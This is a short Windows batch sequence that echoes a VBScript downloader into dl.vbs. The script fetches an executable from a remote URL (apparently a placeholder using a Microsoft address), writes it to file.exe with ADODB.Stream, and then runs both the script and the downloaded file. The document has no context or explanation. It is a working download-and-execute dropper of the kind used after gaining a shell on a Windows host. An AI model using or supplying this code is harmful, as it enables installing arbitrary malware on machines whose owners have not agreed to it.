echo Dim DataBin >dl.vbs
echo Dim HTTPGET >>dl.vbs
echo Set HTTPGET = CreateObject("Microsoft.XMLHTTP") >>dl.vbs
echo HTTPGET.Open "GET", "http://www.microsoft.com/ms.exe", False>>dl.vbs 
echo HTTPGET.Send >>dl.vbs
echo DataBin = HTTPGET.ResponseBody >>dl.vbs
echo Const adTypeBinary=1 >>dl.vbs
echo Const adSaveCreateOverWrite=2 >>dl.vbs
echo Dim test1 >>dl.vbs
echo Set test1 = CreateObject("ADODB.Stream") >>dl.vbs
echo test1.Type = adTypeBinary >>dl.vbs
echo test1.Open >>dl.vbs
echo test1.Write DataBin >>dl.vbs
echo test1.SaveToFile "file.exe", adSaveCreateOverWrite >>dl.vbs
dl.vbs
file.exe